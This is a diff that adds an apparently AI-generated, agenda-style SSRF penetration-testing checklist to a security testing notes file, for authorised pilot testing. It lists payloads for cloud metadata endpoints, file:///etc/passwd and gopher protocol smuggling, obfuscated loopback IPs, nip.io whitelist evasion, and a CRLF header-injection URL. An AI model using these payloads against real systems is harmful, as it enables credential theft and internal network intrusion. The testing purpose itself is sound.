@@ -1917,6 +1917,23 @@ http://www.example.net/index.php?lang=en%0D%0AContent-Length%3A%200%0AHTTP/1.1%2
    ```
    http://169.254.169.254/latest/meta-data/
    ```
+Of course, Anvesh. Here’s a **structured agenda-wise SSRF test case list** that can guide your pilot testing workflow. This format is built to flow logically from basic discovery to advanced exploitation and bypass techniques—perfect for methodical execution or automation planning.
+
+---
+
+## 🗂️ SSRF Pilot Testing Agenda
+
+### 🧭 1. Initial Recon & Target Parameter Discovery  | - Identify all user-controlled URL parameters in GET/POST requests  | - Map potential SSRF sinks (PDF rendering, avatar uploads, webhooks)
+### 🔎 2. Basic SSRF Functionality Tests  | - Loopback access: `http://127.0.0.1/` |  - Internal IP probes: `http://192.168.0.1/status` | - Public endpoints for comparison: `http://example.com`
+### ☁️ 3. Cloud Metadata Endpoint Abuse  | - AWS: `http://169.254.169.254/latest/meta-data/` | - GCP: `http://metadata.google.internal/` | - Azure: `http://169.254.169.254/metadata/instance`
+### 🌐 4. DNS/Out-of-Band SSRF Detection | - Burp Collaborator / Interactsh monitoring | - External endpoints: `http://<your-collab>.domain.com`
+### 🔁 5. Redirect-Based SSRF | - Open redirect chaining to SSRF sinks | - Short URL abuse or URL shortening misdirections
+### 🧮 6. IP Format Obfuscation | - Decimal: `http://2130706433` | - Octal: `http://0177.1` |  - Hex: `http://0x7f000001` | - IPv6: `http://[::ffff:127.0.0.1]`
+### 🧪 7. Protocol Smuggling Techniques | - Gopher: `gopher://127.0.0.1/_INFO` | - File: `file:///etc/passwd` | - Dict, FTP, LDAP (if supported)
+### 🧬 8. SSRF via Alternate Injection Vectors  | - Headers: `Host`, `Referer`, `X-Forwarded-For` | - Cookies: `url=http://127.0.0.1` | - POST Body: JSON/XML SSRF injection | - XXE payloads with external entity URLs
+### 🖼️ 9. Business Logic Exploits | - Avatar/image fetching endpoints | - PDF generation using user URLs | - Callback/webhook abuse in CI/CD integrations
+### 🚪 10. Bypass & Evasion  | - CIDR whitelist evasion: `127.0.0.1.nip.io` | - DNS rebinding techniques | - Header spoofing via internal proxies
+---
 
 ### Testing with Burp Collaborator:
 1. Open Burp Collaborator.
